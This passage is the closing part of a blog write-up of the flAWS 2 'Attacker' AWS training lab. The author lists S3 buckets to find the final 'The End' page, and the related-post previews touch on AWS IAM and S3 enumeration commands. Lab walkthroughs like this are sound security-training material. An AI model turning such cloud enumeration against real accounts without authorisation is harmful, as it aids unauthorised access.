</span></pre></table></code></div></div><p>From here, enumeration seems like a shot in the dark ü§î. Knowing the track record of past solutions, S3 should be the first stop due to static hosting. We can now list all buckets, and there is a ‚ÄúThe End‚Äù bucket, i.e., the lab is complete.</p><p>Final page ‚Üí</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud
</pre></table></code></div></div><hr /></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/blog/categories/lab-practice-notes/">Lab Practice Notes</a>, <a href="/blog/categories/aws-labs/">AWS Labs</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/blog/tags/aws/" class="post-tag no-text-decoration" >aws</a> <a href="/blog/tags/lab/" class="post-tag no-text-decoration" >lab</a> <a href="/blog/tags/flaws2/" class="post-tag no-text-decoration" >flaws2</a> <a href="/blog/tags/security/" class="post-tag no-text-decoration" >security</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=flAWS%202%20-%20Attacker%20-%20Tanishq%20Rupaal&url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Fflaws-2-attacker%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=flAWS%202%20-%20Attacker%20-%20Tanishq%20Rupaal&u=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Fflaws-2-attacker%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Fflaws-2-attacker%2F&text=flAWS%202%20-%20Attacker%20-%20Tanishq%20Rupaal" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Ftanishq.page%2Fblog%2Fposts%2Fflaws-2-attacker%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/blog/posts/dbs-zamasu-timeline/">Dragon Ball Super - Zamasu Timeline 101</a><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-wallabag/">Wallabag in Home Lab</a><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-linkwarden/">Bookmark Manager in Home Lab</a><li class="text-truncate lh-lg"> <a href="/blog/posts/homelab-budgeting/">Personal Finance Budgeting in Home Lab</a><li class="text-truncate lh-lg"> <a href="/blog/posts/dbz-cell-timeline/">Dragon Ball Z - Cell Saga Timeline 101</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/blog/tags/lab/">lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/offsec-proving-grounds/">offsec-proving-grounds</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/oscp/">oscp</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/home-lab/">home-lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/productivity/">productivity</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/aws/">aws</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/programming/">programming</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/github/">github</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/linux/">linux</a></div></section></div><section id="toc-wrapper" class="ps-0 pe-4"><h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/blog/posts/flaws-1/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1648710000" data-df="ll" > Mar 31, 2022 </time><h4 class="pt-0 my-2">flAWS 1</h4><div class="text-muted"><p> Level 1 This level is buckets of fun. See if you can find the first sub-domain. Begin with doing a dig of flaws.cloud, which returns the following ‚Üí ; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.16.1-Ubuntu &amp;lt;...</p></div></div></a></article><article class="col"> <a href="/blog/posts/pentester-academy-aws-iam/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1651129200" data-df="ll" > Apr 28, 2022 </time><h4 class="pt-0 my-2">Pentester Academy AWS IAM Attack Lab</h4><div class="text-muted"><p> Enumeration To get information about current caller ‚Üí awsn sts get-identity-caller List and see last uses for access keys ‚Üí # List all access keys awsn iam list-access-keys # G...</p></div></div></a></article><article class="col"> <a href="/blog/posts/pentester-academy-aws-s3/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1651129200" data-df="ll" > Apr 28, 2022 </time><h4 class="pt-0 my-2">Pentester Academy AWS S3 Attack Lab</h4><div class="text-muted"><p> Enumeration List buckets and get region for bucket ‚Üí # List buckets using s3api awsn s3api list-buckets | jq &#39;.Buckets[] | .Name&#39; | tr -d &quot;\&quot;&quot; # Get region for bucket awsn s3api ...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/blog/posts/homelab-homepage/" class="btn btn-outline-primary" aria-label="Older" ><p>Homepage Dashboard in Home Lab</p></a> <a href="/blog/posts/newbified-digitization/" class="btn btn-outline-primary" aria-label="Newer" ><p>Document Digitization - The Paperless Revolution</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p> ¬© <time>2024</time> <a href="https://twitter.com/etheriosking">Tanishq Rupaal</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/blog/tags/lab/">lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/offsec-proving-grounds/">offsec-proving-grounds</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/oscp/">oscp</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/home-lab/">home-lab</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/productivity/">productivity</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/aws/">aws</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/programming/">programming</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/github/">github</a> <a class="post-tag btn btn-outline-primary" href="/blog/tags/linux/">linux</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.25.0/dist/tocbot.min.js"></script> <script defer src="/blog/assets/js/dist/post.min.js"></script> <script defer src="/blog/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-B88HEPZBVJ"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-B88HEPZBVJ'); }); </script> <script> /* Note: dependent library will be loaded in `js-selector.html` */ SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/blog/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
